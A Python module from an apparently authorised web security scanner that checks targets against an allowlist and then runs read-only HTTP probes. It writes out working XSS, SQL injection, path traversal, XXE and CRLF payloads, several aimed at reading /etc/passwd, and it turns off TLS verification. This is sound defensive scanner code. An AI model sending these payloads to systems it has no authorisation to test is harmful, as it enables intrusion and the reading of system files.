"""
Async exploit executor.

Executes HTTP-level, non-destructive probes against an approved target URL
and returns structured evidence.  All network calls are bounded by a strict
timeout and the policy engine gate must pass before execution begins.

Supported exploit types (HTTP-only, read-only probes):
  xss_reflect     — inject canary into parameters, check reflection
  sqli_error      — inject SQL error payloads, detect DB error messages
  sqli_boolean    — boolean-based blind SQLi timing/content diff
  open_redirect   — inject redirect URLs, check Location header
  path_traversal  — inject traversal sequences, check for /etc/passwd markers
  header_injection — inject CRLF sequences into header values
  ssrf_oob        — inject out-of-band callback URL (canary only, no DNS lookup)
"""
from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import httpx

from app.services.sandbox.policy import PolicyContext, PolicyViolation, check as policy_check

logger = logging.getLogger(__name__)

_DEFAULT_TIMEOUT = 10.0  # seconds per probe
_USER_AGENT = "ATTT-Security-Scanner/1.0 (Authorized Penetration Test)"


@dataclass
class ExploitResult:
    exploit_type: str
    target_url: str
    payload: str
    verified: bool
    confidence: float          # 0.0–1.0
    evidence: dict = field(default_factory=dict)
    error: str | None = None
    duration_ms: int = 0


# ── Public entry point ────────────────────────────────────────────────────────

def run_exploit(
    target_url: str,
    exploit_type: str,
    finding: dict,
    approved_domains: list[str],
    attempts_this_scan: int = 0,
    timeout: float = _DEFAULT_TIMEOUT,
) -> ExploitResult:
    """
    Validate policy then execute the exploit probe.

    Args:
        target_url:          The vulnerable endpoint URL.
        exploit_type:        One of the supported exploit type strings.
        finding:             Finding dict (provides severity, evidence params).
        approved_domains:    Allowlist of domains from the Asset record.
        attempts_this_scan:  How many exploits have already run in this scan.
        timeout:             Per-request timeout in seconds.

    Returns:
        ExploitResult with verified=True if the vulnerability was confirmed.
    """
    payload = _select_payload(exploit_type, finding)

    ctx = PolicyContext(
        target_url=target_url,
        exploit_type=exploit_type,
        payload=payload,
        severity=finding.get("severity", "Low"),
        approved_domains=approved_domains,
        attempts_this_scan=attempts_this_scan,
    )

    try:
        policy_check(ctx)
    except PolicyViolation as exc:
        logger.warning("Policy blocked exploit: %s", exc)
        return ExploitResult(
            exploit_type=exploit_type,
            target_url=target_url,
            payload=payload,
            verified=False,
            confidence=0.0,
            error=str(exc),
        )

    return _dispatch(exploit_type, target_url, payload, finding, timeout)


# ── Dispatch table ────────────────────────────────────────────────────────────

def _dispatch(
    exploit_type: str,
    url: str,
    payload: str,
    finding: dict,
    timeout: float,
) -> ExploitResult:
    probes = {
        "xss_reflect":      _probe_xss,
        "sqli_error":       _probe_sqli_error,
        "sqli_boolean":     _probe_sqli_boolean,
        "open_redirect":    _probe_open_redirect,
        "path_traversal":   _probe_path_traversal,
        "header_injection": _probe_header_injection,
        "ssrf_oob":         _probe_ssrf_oob,
        "auth_bypass":      _probe_auth_bypass,
        "xxe_detect":       _probe_xxe,
    }
    probe_fn = probes.get(exploit_type)
    if probe_fn is None:
        return ExploitResult(
            exploit_type=exploit_type, target_url=url, payload=payload,
            verified=False, confidence=0.0, error=f"Unknown exploit type: {exploit_type}",
        )

    t0 = time.monotonic()
    try:
        result = probe_fn(url, payload, finding, timeout)
        result.duration_ms = int((time.monotonic() - t0) * 1000)
        return result
    except Exception as exc:
        logger.warning("Exploit probe %s failed: %s", exploit_type, exc)
        return ExploitResult(
            exploit_type=exploit_type, target_url=url, payload=payload,
            verified=False, confidence=0.0,
            error=str(exc),
            duration_ms=int((time.monotonic() - t0) * 1000),
        )


# ── Probe implementations ─────────────────────────────────────────────────────

_CANARY = "attt-xss-8f3a"


def _probe_xss(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    param = finding.get("evidence", {}).get("param", "q")
    probe_url = _inject_param(url, param, payload)
    resp = _get(probe_url, timeout)
    verified = payload in (resp.text or "")
    return ExploitResult(
        exploit_type="xss_reflect", target_url=url, payload=payload,
        verified=verified,
        confidence=0.9 if verified else 0.1,
        evidence={"status_code": resp.status_code, "reflected": verified,
                  "probe_url": probe_url},
    )


def _probe_sqli_error(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    param = finding.get("evidence", {}).get("param", "id")
    probe_url = _inject_param(url, param, payload)
    resp = _get(probe_url, timeout)
    _DB_ERRORS = ["sql syntax", "mysql_fetch", "ORA-", "pg_query", "sqlite3",
                  "unclosed quotation", "quoted string not properly terminated"]
    body_lower = (resp.text or "").lower()
    matched = [e for e in _DB_ERRORS if e.lower() in body_lower]
    verified = len(matched) > 0
    return ExploitResult(
        exploit_type="sqli_error", target_url=url, payload=payload,
        verified=verified,
        confidence=0.85 if verified else 0.1,
        evidence={"status_code": resp.status_code, "error_strings": matched},
    )


def _probe_sqli_boolean(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    param = finding.get("evidence", {}).get("param", "id")
    true_url = _inject_param(url, param, "1 AND 1=1")
    false_url = _inject_param(url, param, "1 AND 1=2")
    resp_true = _get(true_url, timeout)
    resp_false = _get(false_url, timeout)
    len_diff = abs(len(resp_true.text or "") - len(resp_false.text or ""))
    verified = resp_true.status_code == 200 and len_diff > 50
    return ExploitResult(
        exploit_type="sqli_boolean", target_url=url, payload=payload,
        verified=verified,
        confidence=0.7 if verified else 0.1,
        evidence={"true_len": len(resp_true.text or ""),
                  "false_len": len(resp_false.text or ""),
                  "len_diff": len_diff},
    )


def _probe_open_redirect(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    param = finding.get("evidence", {}).get("param", "redirect")
    probe_url = _inject_param(url, param, "https://example.com")
    resp = _get(probe_url, timeout, follow_redirects=False)
    location = resp.headers.get("location", "")
    verified = "example.com" in location
    return ExploitResult(
        exploit_type="open_redirect", target_url=url, payload=payload,
        verified=verified,
        confidence=0.95 if verified else 0.1,
        evidence={"location_header": location, "status_code": resp.status_code},
    )


def _probe_path_traversal(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    probe_url = url.rstrip("/") + "/" + payload
    resp = _get(probe_url, timeout)
    markers = ["root:x:", "bin:x:", "[boot loader]", "for 16-bit app support"]
    body = (resp.text or "").lower()
    found = [m for m in markers if m.lower() in body]
    verified = len(found) > 0
    return ExploitResult(
        exploit_type="path_traversal", target_url=url, payload=payload,
        verified=verified,
        confidence=0.9 if verified else 0.05,
        evidence={"markers_found": found, "status_code": resp.status_code},
    )


def _probe_header_injection(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    injected = f"legitimate-value\r\nX-Injected: attt-test"
    param = finding.get("evidence", {}).get("param", "User-Agent")
    resp = _get(url, timeout, headers={param: injected})
    verified = "x-injected" in {k.lower() for k in resp.headers}
    return ExploitResult(
        exploit_type="header_injection", target_url=url, payload=payload,
        verified=verified,
        confidence=0.8 if verified else 0.1,
        evidence={"injected_header_reflected": verified,
                  "status_code": resp.status_code},
    )


def _probe_ssrf_oob(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    # Canary-based: we inject a URL pointing to a known-invalid OOB callback.
    # A real SSRF probe would register with an OOB service (Burp Collaborator,
    # interactsh). Here we inject and record the attempt for manual review.
    param = finding.get("evidence", {}).get("param", "url")
    canary_url = f"http://attt-oob-canary.internal/{_CANARY}"
    probe_url = _inject_param(url, param, canary_url)
    resp = _get(probe_url, timeout)
    return ExploitResult(
        exploit_type="ssrf_oob", target_url=url, payload=canary_url,
        verified=False,   # requires OOB callback to confirm
        confidence=0.4,   # unconfirmed — needs manual OOB check
        evidence={"canary_url": canary_url, "status_code": resp.status_code,
                  "note": "OOB confirmation requires external callback listener"},
    )


def _probe_auth_bypass(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    resp = _get(url, timeout, headers={"Authorization": "Bearer null"})
    verified = resp.status_code == 200
    return ExploitResult(
        exploit_type="auth_bypass", target_url=url, payload="Bearer null",
        verified=verified,
        confidence=0.6 if verified else 0.1,
        evidence={"status_code": resp.status_code},
    )


def _probe_xxe(url: str, payload: str, finding: dict, timeout: float) -> ExploitResult:
    xxe_payload = ('<?xml version="1.0"?><!DOCTYPE foo ['
                   '<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                   '<foo>&xxe;</foo>')
    resp = _post(url, xxe_payload, timeout, content_type="application/xml")
    markers = ["root:x:", "bin:x:"]
    found = [m for m in markers if m in (resp.text or "")]
    verified = len(found) > 0
    return ExploitResult(
        exploit_type="xxe_detect", target_url=url, payload=xxe_payload,
        verified=verified,
        confidence=0.85 if verified else 0.1,
        evidence={"markers_found": found, "status_code": resp.status_code},
    )


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _get(
    url: str,
    timeout: float,
    headers: dict | None = None,
    follow_redirects: bool = True,
) -> httpx.Response:
    h = {"User-Agent": _USER_AGENT, **(headers or {})}
    with httpx.Client(verify=False, follow_redirects=follow_redirects,
                      timeout=timeout) as client:
        return client.get(url, headers=h)


def _post(
    url: str,
    content: str,
    timeout: float,
    content_type: str = "application/x-www-form-urlencoded",
) -> httpx.Response:
    h = {"User-Agent": _USER_AGENT, "Content-Type": content_type}
    with httpx.Client(verify=False, timeout=timeout) as client:
        return client.post(url, content=content, headers=h)


def _inject_param(url: str, param: str, value: str) -> str:
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _select_payload(exploit_type: str, finding: dict) -> str:
    payloads: dict[str, str] = {
        "xss_reflect":      f'"><script>/*{_CANARY}*/</script>',
        "sqli_error":       "' OR 1=1--",
        "sqli_boolean":     "1 AND 1=1",
        "open_redirect":    "https://example.com",
        "path_traversal":   "../../../../../../etc/passwd",
        "header_injection": "value\r\nX-Test: attt",
        "ssrf_oob":         f"http://attt-oob.internal/{_CANARY}",
        "auth_bypass":      "Bearer null",
        "xxe_detect":       "<?xml?>",
    }
    return payloads.get(exploit_type, "ATTT-PROBE")
